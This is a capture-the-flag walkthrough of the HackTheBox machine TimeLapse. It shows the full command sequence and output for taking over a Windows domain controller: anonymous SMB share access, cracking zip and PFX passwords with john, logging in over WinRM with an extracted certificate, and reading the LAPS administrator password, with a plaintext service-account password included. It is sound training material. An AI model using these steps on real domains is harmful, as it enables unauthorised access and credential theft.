---
title: "HackTheBox - TimeLapse"
author: Nasrallah
description: ""
date: 2023-04-05 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, LAPS, SMB, winrm, john, crack]
img_path: /assets/img/hackthebox/machines/timelapse
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [TimeLapse](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.152                                                                                                                     [53/145]
Host is up, received echo-reply ttl 127 (0.57s latency).                                                                                                      
Scanned at 2023-03-31 13:59:45 +00 for 113s                                                                                                                   
                                                                                                                                                              
PORT      STATE SERVICE       REASON          VERSION                                                                                                         
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus                                                                                                 
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-03-31 21:59:53Z)                                                  
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                           
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                   
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)                
445/tcp   open  microsoft-ds? syn-ack ttl 127                                                                                                                 
464/tcp   open  kpasswd5?     syn-ack ttl 127                                                                                                                 
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                                                                             
636/tcp   open  tcpwrapped    syn-ack ttl 127                                                                                                                 
5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                         
| ssl-cert: Subject: commonName=dc01.timelapse.htb                                                                                                            
| Issuer: commonName=dc01.timelapse.htb                                                                                                                       
| Public Key type: rsa                                                                                                                                        
| Public Key bits: 2048                                                                                                                                       
| Signature Algorithm: sha256WithRSAEncryption                                                                                                                
| Not valid before: 2021-10-25T14:05:29 
| Not valid after:  2022-10-25T14:25:29 
| MD5:   e233a19945040859013fb9c5e4f691c3
| SHA-1: 5861acf776b8703fd01ee25dfc7c9952a4477652
| -----BEGIN CERTIFICATE-----                                                                                                                                 
| MIIDCjCCAfKgAwIBAgIQLRY/feXALoZCPZtUeyiC4DANBgkqhkiG9w0BAQsFADAd                                                                                            
| MRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwHhcNMjExMDI1MTQwNTI5WhcN                                                                                            
| MjIxMDI1MTQyNTI5WjAdMRswGQYDVQQDDBJkYzAxLnRpbWVsYXBzZS5odGIwggEi                                                                                            
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJdoIQMYt47skzf17SI7M8jubO                                                                                            
| rD6sHg8yZw0YXKumOd5zofcSBPHfC1d/jtcHjGSsc5dQQ66qnlwdlOvifNW/KcaX                                                                                            
| LqNmzjhwL49UGUw0MAMPAyi1hcYP6LG0dkU84zNuoNMprMpzya3+aU1u7YpQ6Dui                                                                                            
| AzNKPa+6zJzPSMkg/TlUuSN4LjnSgIV6xKBc1qhVYDEyTUsHZUgkIYtN0+zvwpU5                                                                                            
| isiwyp9M4RYZbxe0xecW39hfTvec++94VYkH4uO+ITtpmZ5OVvWOCpqagznTSXTg                                                                                            
| FFuSYQTSjqYDwxPXHTK+/GAlq3uUWQYGdNeVMEZt+8EIEmyL4i4ToPkqjPF1AgMB                                                                                            
| AAGjRjBEMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAKBggrBgEFBQcDATAdBgNV                                                                                            
| HQ4EFgQUZ6PTTN1pEmDFD6YXfQ1tfTnXde0wDQYJKoZIhvcNAQELBQADggEBAL2Y                                                                                            
| /57FBUBLqUKZKp+P0vtbUAD0+J7bg4m/1tAHcN6Cf89KwRSkRLdq++RWaQk9CKIU                                                                                            
| 4g3M3stTWCnMf1CgXax+WeuTpzGmITLeVA6L8I2FaIgNdFVQGIG1nAn1UpYueR/H                                                                                            
| NTIVjMPA93XR1JLsW601WV6eUI/q7t6e52sAADECjsnG1p37NjNbmTwHabrUVjBK                                                                                            
| 6Luol+v2QtqP6nY4DRH+XSk6xDaxjfwd5qN7DvSpdoz09+2ffrFuQkxxs6Pp8bQE                                                                                            
| 5GJ+aSfE+xua2vpYyyGxO0Or1J2YA1CXMijise2tp+m9JBQ1wJ2suUS2wGv1Tvyh                                                                                            
| lrrndm32+d0YeP/wb8E=                                                                                                                                        
|_-----END CERTIFICATE-----                                                                                                                                   
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                   
|_ssl-date: 2023-03-31T22:01:28+00:00; +7h59m59s from scanner time.                                                                                           
| tls-alpn:                                                                                                                                                   
|_  http/1.1                                                                                                                                                  
|_http-title: Not Found                                                                                                                                       
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing                                                                                            
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                           
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                                                                             
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                           
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                           
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                          

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-31T22:00:49
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 36715/tcp): CLEAN (Timeout)
|   Check 2 (port 32357/tcp): CLEAN (Timeout)
|   Check 3 (port 59402/udp): CLEAN (Timeout)
|   Check 4 (port 22941/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
```

There are bunch of open ports that suggests the target is a windows domain controller.

We have winrm running on port 5986 with ssl, and nmap scripts reveals the hostname `timelapse.htb` and `dc01.timelapse.htb`, let's add them both to `/etc/hosts`.

### SMB

Let's start smb enumeration with `crackmapexec`.

```terminal
$ crackmapexec smb 10.10.11.152 --shares                                                                                                           130 ⨯
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

Couldn't list any shares with `crackmapexec`, let's try with `smbclient`.

```terminal
$ sudo smbclient -L timelapse.htb -N  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

We found some default windows shares but the one looks interesting is `Shares`, let's connect to it.

```terminal
$ smbclient //10.10.11.152/Shares -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 16:39:15 2021
  ..                                  D        0  Mon Oct 25 16:39:15 2021
  Dev                                 D        0  Mon Oct 25 20:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 16:48:42 2021

                6367231 blocks of size 4096. 1713503 blocks available
smb: \> ls Dev\
  .                                   D        0  Mon Oct 25 20:40:06 2021
  ..                                  D        0  Mon Oct 25 20:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 16:46:42 2021

                6367231 blocks of size 4096. 1713503 blocks available
smb: \> ls HelpDesk\
  .                                   D        0  Mon Oct 25 16:48:42 2021
  ..                                  D        0  Mon Oct 25 16:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 15:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 15:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 15:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 15:57:44 2021

                6367231 blocks of size 4096. 1713503 blocks available
smb: \> cd Dev\
smb: \Dev\> get winrm_backup.zip 
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (3.9 KiloBytes/sec) (average 3.9 KiloBytes/sec)
smb: \Dev\>
```

We found two directories, `Dev` and `HelpDesk`, the first one has a backup file and the other one contains some windows files.

We download the `winrm_backup.zip` file.

Let's unzip the file.

```terminal
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/timelapse]
└──╼ $ unzip winrm_backup.zip         
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:                                                                                                                                                      ```

The file require a password, we can use `zip2john` to extract the hash and then crack the password using `john`.

```terminal
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/timelapse]
└──╼ $ zip2john winrm_backup.zip > hash                                                                                                                  80 ⨯
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683
                                                                                                                                                              
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/timelapse]
└──╼ $ john -w=/usr/share/wordlists/rockyou.txt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:01 DONE (2023-04-01 14:01) 0.7518g/s 2611Kp/s 2611Kc/s 2611KC/s surfroxy154..supergay01
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We got the password, now let's unzip the file.

```terminal
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/timelapse]
└──╼ $ unzip winrm_backup.zip                    
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
                                                                                                                                                              
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/timelapse]
└──╼ $ ls
hash  legacyy_dev_auth.pfx  scans  winrm_backup.zip

```

We extracted a `pfx` file, and after some research i find that we can use the file to get a [shell over WinRM](https://wadcoms.github.io/wadcoms/Evil-Winrm-PKINIT/).

## **Foothold**

The first thing we need to do is extract the private key and the certificate from the `.pfx` file.

```terminal
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key
Enter Import Password:
Mac verify error: invalid password?
```

Looks like the file is password protected.

We can use `pfx2john` to extract a hash and crack it using `john`.

```terminal
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/timelapse]
└──╼ $ python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.hash                                                                                1 ⨯
                                                                                                                                                              
┌─[sirius@ParrotOS]─[~/CTF/HTB/Machines/timelapse]
└──╼ $ john -w=/usr/share/wordlists/rockyou.txt pfx.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 128/128 SSE2 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:04:22 DONE (2023-04-01 14:40) 0.003808g/s 12304p/s 12304c/s 12304C/s thuglife06..thug211
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We got the password, let's try again

```terminal
──╼ $ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key                                                                                         
Enter Import Password:                                                                                                                                        
Enter PEM pass phrase:                                                                                                                                        
Verifying - Enter PEM pass phrase:                                                                                                                            
                                                                                                                                                                                                                                                                          
──╼ $ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out winrm.crt         
Enter Import Password:                    
```

Now let's use `evil-winrm` to connect to the target.


```bash
evil-winrm -i 10.10.11.152 -c winrm.crt -k priv.key -S -r timelapse.htb
```

![](1.png)


## **Privilege Escalation**

Checking powershell history file we find a possible password.

![](2.png)

We couldn't use the password to login as Administrator but it worked with use `svc_deploy`

![](3.png)

Now let's run `net user svc_deploy` and see if we find something interesting.

```terminal
*Evil-WinRM* PS C:\> net user svc_deploy              
User name                    svc_deploy 
Full Name                    svc_deploy                                                                                                                       Comment                                                                        
User's comment  
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never                                                                                                                            
                                                                               
Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes
                                                                               
Workstations allowed         All                                                                                                                              
Logon script
User profile         
Home directory
Last logon                   10/25/2021 12:25:53 PM                                                                                                           

Logon hours allowed          All                                                                                                                              

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.                                
```

We see the user `svc_deploy` is part of the group `LAPS_Readers`.

LAPS or Local Administrator Password Solution is a way of managing local administrator passwords for computers on the domain, and if we have read permission we can retrieve the Administrator's password.

I searched for ways to get the password from LAPS and found this [article](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword) showcasing how to do so using `crackmapexec`

We need to run the following command:

```bash
crackmapexec ldap dc01.timelapse.htb -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --module laps
```

![](4.png)

We got the password, now we can use `evil-winrm` to get a shell as Administrator.

![](5.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).